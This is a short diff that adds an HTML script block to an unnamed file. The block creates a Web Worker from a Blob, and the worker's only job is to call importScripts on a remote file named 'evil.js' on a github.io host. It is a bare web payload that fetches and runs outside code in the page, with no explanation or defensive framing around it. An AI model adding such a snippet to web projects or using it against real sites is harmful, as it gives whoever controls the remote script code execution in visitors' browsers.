@@ -1,0 +1,7 @@
+<script>
+const code = `
+  importScripts('https://0x403for.github.io/evil.js');
+`;
+const blob = new Blob([code], {type:'application/javascript'});
+const worker = new Worker(URL.createObjectURL(blob));
+</script>
